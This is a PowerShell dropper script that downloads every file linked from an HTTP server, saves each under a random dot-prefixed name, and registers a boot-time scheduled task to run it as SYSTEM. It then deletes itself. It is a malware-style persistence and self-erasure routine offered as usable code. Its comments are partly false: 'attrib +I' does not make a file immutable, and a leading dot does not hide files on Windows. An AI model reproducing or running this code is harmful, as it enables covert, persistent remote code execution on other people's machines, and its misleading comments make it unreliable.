# Set the URL of the Python Simple HTTP server (never tested)
$URL = "http://localhost:8000"

# Download all files from the server and save them as hidden files with random alphanumeric names
Invoke-WebRequest -Uri $URL | Select-String -Pattern '<a href="(.*?)">' | ForEach-Object {
    $filename = $_.Matches.Groups[1].Value
    # Generate a random alphanumeric filename for the hidden file
    $newname = -join ([char[]][byte[]](1..6 | ForEach-Object { Get-Random -Minimum 97 -Maximum 122 }))
    # Download the file from the server and save it as a hidden file
    Invoke-WebRequest -Uri "$URL/$filename" -OutFile ".$newname" | Out-Null
    # Make the file immutable
    attrib +I ".$newname"
    # Create a scheduled task to start the file at boot time
    $description = $newname
    $action = New-ScheduledTaskAction -Execute "powershell" -Argument "-File `"$PWD\.$newname`""
    $trigger = New-ScheduledTaskTrigger -AtStartup
    Register-ScheduledTask -TaskName $newname -Description $description -Action $action -Trigger $trigger -User "SYSTEM"
}

# Delete the script itself
Remove-Item -Path $MyInvocation.MyCommand.Path
